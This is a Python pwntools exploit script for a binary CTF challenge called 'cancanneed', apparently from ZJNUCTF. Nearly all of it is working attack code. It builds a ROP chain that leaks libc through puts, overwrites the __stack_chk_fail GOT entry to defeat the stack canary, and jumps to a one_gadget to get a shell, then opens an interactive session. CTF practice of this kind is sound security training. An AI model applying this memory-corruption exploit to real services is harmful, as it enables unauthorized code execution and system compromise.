#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2023/03/06 12:00:25
# -----------------------------------

from pwn import *

DEBUG = 0
context.log_level = "debug"
context.arch = "amd64"

io = process("../file/cancanneed") if DEBUG else remote("127.0.0.1", 20003)
elf: ELF = ELF("../file/cancanneed")
libc: ELF = elf.libc

sa = lambda word, data: io.sendafter(word, data)
sl = lambda data: io.sendline(data)
l64 = lambda: u64(io.recvuntil(b"\x7f", False)[-6:].ljust(8, b"\x00"))

vuln_addr = 0x40124D
pop_rdi = 0x4011DE
pop_rsi = 0x4011E0
pop_r10 = 0x4011E2
__stack_chk_fail_got = 0x404028
next_rbp = 0x404900

sa("ZJNUCTF!", flat([pop_rdi, elf.got["puts"], elf.sym["puts"], vuln_addr]))
libc.address = l64() - libc.sym["puts"]
print(f"libc_base --> {libc.address:#x}")

sa("read?", p64(__stack_chk_fail_got))
sa("ok", b"\x60")
sa("canary!", b"b" * 0x20 + flat([next_rbp, pop_r10, 0, libc.address + 0xEBCF1]))

time.sleep(0.5)
sl(b"exec 1>&2")    # 重定向

io.interactive()
